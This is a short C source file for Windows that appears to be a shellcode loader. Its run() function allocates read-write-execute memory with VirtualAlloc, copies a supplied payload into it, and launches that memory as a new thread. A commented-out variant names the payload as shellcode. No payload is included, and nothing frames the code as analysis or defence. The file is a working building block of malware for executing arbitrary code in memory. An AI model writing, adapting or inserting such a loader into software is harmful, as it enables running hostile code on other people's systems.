#include <Windows.h>

void run(char * payload_data, int payload_bits) {
    //LPVOID heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    //LPVOID ptr = HeapAlloc(heap, 0, shellcode_len / 8);

    LPVOID ptr = VirtualAlloc(0, (payload_bits / 8), 0x3000, 0x40);
    RtlMoveMemory(ptr, payload_data, payload_bits / 8);


    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, 0);
    Sleep(2000);
}